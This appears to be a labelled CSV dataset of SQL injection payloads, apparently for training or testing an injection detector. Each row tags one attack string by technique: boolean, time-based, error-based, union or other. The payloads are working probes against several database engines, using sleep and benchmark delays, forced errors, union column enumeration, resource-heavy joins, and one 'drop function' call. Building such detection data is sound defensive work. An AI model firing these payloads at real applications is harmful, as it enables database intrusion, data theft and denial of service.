label,payload,family
attack,select   (  case when   (  9816  =  1693  )   then 9816 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,error
attack,select   (  case when   (  9931  =  3424  )   then 1 else 9931*  (  select 9931 from master..sysdatabases  )   end  )  --,other
attack,1' or sleep  (  5  )  #,time
attack,"1'   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",boolean
attack,"1'   )    )    union all select null,null,null,null--",union
attack,1'+  (  select 'njee' where 4101  =  4101 and 3090  =  7873  )  +',boolean
attack,"1""   )    )    as tybm where 2687  =  2687 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"1' in boolean mode  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,select   (  case when   (  7096  =  2568  )   then 7096 else 1/  (  select 0  )   end  )  --,other
attack,"-6093'  )   where 9676  =  9676 union all select 9676,9676,9676,9676,9676,9676--",union
attack,-2891 where 1770  =  1770 or 9290  =  5866,boolean
attack,-9225  )   or   (  8258  =  2726  )  *2726 and   (  9900  =  9900,boolean
attack,1' where 8099  =  8099,other
attack,"1""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""whld""  =  ""whld",error
attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",boolean
attack,"-8841%""  )   or 4361  =  1910",boolean
attack,select   (  case when   (  5163  =  4861  )   then 1 else 5163*  (  select 5163 from master..sysdatabases  )   end  )  --,other
attack,"1%"" and 9198  =  9198--",boolean
attack,"1'  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'tvcm'  =  'tvcm",boolean
attack," end and   (  ""%""  =  """,boolean
attack,"1""  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""qblj"" like ""qblj",boolean
attack,"1%"" and 6408  =  7959--",boolean
attack,"1""  )   as hfvz where 7186  =  7186 union all select null,null,null,null,null,null#",union
attack,"-3461""   )    )    union all select 6342,6342,6342,6342,6342,6342#",union
attack,"1  )   as czeu where 1738  =  1738 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",error
attack,"-9456%""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""%""  =  """,error
attack,1' where 8770  =  8770 union all select null--,union
attack,1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'gsjp'  =  'gsjp,boolean
attack,1'+  (  select 'mquh' where 3933  =  3933,other
attack,select case when 3252  =  9622 then 1 else null end--,other
attack,"1""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""yrgy"" like ""yrgy",boolean
attack,"1'+  (  select bldn where 8321  =  8321 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",boolean
attack,"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'yabn'  =  'yabn",boolean
attack,"1""  )   where 2657  =  2657 and 5309  =  7592--",boolean
attack,"-1868""  )   where 9495  =  9495 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",error
attack,"1"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""zcfa""  =  ""zcfa",boolean
attack,"-5863"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""gkvy""  =  ""gkvy",error
attack,"1"" where 6347  =  6347 union all select null,null,null,null,null,null,null,null#",union
attack,"1""  )   where 3826  =  3826",other
attack,"1""  )   where 9499  =  9499",other
attack,select   (  case when   (  3344  =  8103  )   then 3344 else 1/  (  select 0  )   end  )  --,other
attack,"1""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""ynde""  =  ""ynde",error
attack,"select * from generate_series  (  3607,3607,case when   (  3607  =  4242  )   then 1 else 0 end  )   limit 1--",other
attack,"1' and elt  (  4249  =  4249,7259  )   and 'pgvz'  =  'pgvz",boolean
attack,"1' in boolean mode  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1   )    )    as somz where 1598  =  1598,other
attack," end and    (    (     (  ""poee""  =  ""poee",boolean
attack,"-7238%' or make_set  (  5375  =  9563,9563  )   and '%'  =  '",boolean
attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #",other
attack,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   -- yczq,time
attack,"1  )   where 2781  =  2781 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",boolean
attack,"1   )    )    as ynzg where 1926  =  1926 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",error
attack,1  )   as hhly where 2906  =  2906,other
attack,"1'||  (  select 'rqzu' from dual where 9516  =  9516 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,-7430'  )   as xfah where 1596  =  1596 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,error
attack,"1""   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""fogb"" like ""fogb",error
attack,select case when 4537  =  8418 then 1 else null end--,other
attack,"iif  (  3447  =  1084,1,1/0  )  ",other
attack,"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'vfnl'  =  'vfnl",error
attack,-2429%' or 6890  =  5846,boolean
attack,"1'   )    )    as ewyk where 4828  =  4828 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",boolean
attack,"1' in boolean mode  )   union all select null,null,null,null,null--",union
attack,select   (  case when   (  7271  =  1658  )   then 7271 else 7271*  (  select 7271 from information_schema.character_sets  )   end  )  #,other
attack,"1 where 1153  =  1153 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",error
attack,"1' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,-4023 or   (  8779  =  5716  )  *5716,boolean
attack,"-1620   )    )    union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--",union
attack,1 waitfor delay '0:0:5'-- nnnp,time
attack,select   (  case when   (  5698  =  3453  )   then 5698 else 1/  (  select 0  )   end  )  --,other
attack,1  )   rlike   (  select   (  case when   (  5477  =  7492  )   then 1 else 0x28 end   )    )    and   (  4427  =  4427,boolean
attack,"1%""   )    )    union all select null--",union
attack,"-9810'  )   where 4361  =  4361 or elt  (  1032  =  1032,3623  )  --",boolean
attack,"1""   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""xqlh""  =  ""xqlh",boolean
attack,1'   )    )    waitfor delay '0:0:5'--,time
attack,-3125'   )    )     )   order by 1#,other
attack,-9087 or 3038  =  3038,boolean
attack,"1  )   as tgqd where 6369  =  6369 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",error
attack,"1""  )   union all select null,null,null,null--",union
attack,"1""  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",boolean
attack,-1192 order by 1#,other
attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  ""ihqf""  =  ""ihqf",boolean
attack,-8074'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'lnwm'  =  'lnwm,error
attack,"-7831""   )    )    as krzi where 3798  =  3798 order by 1--",other
attack,"-4522""  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""mbkq""  =  ""mbkq",error
attack,"-2028'   )    )     )   union all select 8698,8698,8698,8698#",union
attack,1'  )   or sleep  (  5  )  #,time
attack,"1""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""tzog"" like ""tzog",boolean
attack,"1'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",error
attack,"-9772' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'igaa'  =  'igaa",error
attack,"1' in boolean mode  )   union all select null,null,null,null,null,null--",union
attack,1'   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'mmow'  =  'mmow,boolean
attack,1'  )   where 3861  =  3861,other
attack,"1""  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,"-2059%"" or elt  (  4587  =  3101,3101  )   and ""%""  =  """,boolean
attack,"-5218  )   union all select 9677,9677#",union
attack,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""zzmn""  =  ""zzmn",boolean
attack,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and ""%""  =  """,boolean
attack,"1""   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""urgd""  =  ""urgd",error
attack,"-8988""   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""dyxh"" like ""dyxh",error
attack,"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'cdgm' like 'cdgm",boolean
attack,if  (  1928  =  4811  )   select 1928 else drop function ucko--,other
attack,"-8698"" where 1990  =  1990 or   (  8459  =  8459  )  *4906--",boolean
attack,"1"" where 3247  =  3247 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",boolean
attack,1'+  (  select gthp where 7311  =  7311 or sleep  (  5  )  #,time
attack,"1""   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,"-3278'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'zxig' like 'zxig",boolean
attack,"-6279'  )   union all select 3026,3026,3026,3026,3026,3026,3026,3026--",union
attack,"1   )    )    and elt  (  9288  =  6067,6067  )   and    (    (   1895  =  1895",boolean
attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  # cdjm",other
attack,"1'||  (  select 'odud' from dual where 2468  =  2468 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,1'+  (  select 'gtqr' where 5660  =  5660,other
attack,"1"" where 9618  =  9618 and   (  3020  =  3020  )  *6703--",boolean
attack,"1""  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""bmbg"" like ""bmbg",boolean
attack,"1""   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""opgb"" like ""opgb",boolean
attack,"1%"" and   (  3020  =  3020  )  *6703 and ""%""  =  """,boolean
attack,"-8053"" where 5458  =  5458 or 9323  =  9323#",boolean
